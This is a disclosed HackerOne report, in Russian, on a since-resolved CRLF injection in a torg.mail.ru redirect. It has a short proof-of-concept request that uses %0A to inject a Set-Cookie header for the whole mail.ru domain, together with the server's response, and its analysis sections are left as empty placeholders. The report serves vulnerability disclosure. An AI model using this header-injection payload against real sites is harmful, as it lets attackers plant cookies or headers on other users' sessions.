---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '138332'
original_report_id: '138332'
title: '[torg.mail.ru] CRLF Injection'
team_handle: mailru
created_at: '2016-05-12T15:46:44.052Z'
disclosed_at: '2016-12-12T12:45:28.500Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
---

# [torg.mail.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 138332
- Weakness: 
- Program: mailru
- Disclosed At: 2016-12-12T12:45:28.500Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Редирект http://torg.mail.ru//foo → http://torg.mail.ru/foo подвержен CRLF-инъекции, что позволяет атакующему внедрить произвольный заголовок в ответ сервера.

Пример установки значения куки для всего домена mail.ru:

> GET http://torg.mail.ru//xxx%0ASet-Cookie:test=test;domain=.mail.ru
> 
> 301 Moved Permanently
> 
> Location: http://torg.mail.ru/xxx
> Set-Cookie: test=test;domain=.mail.ru

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
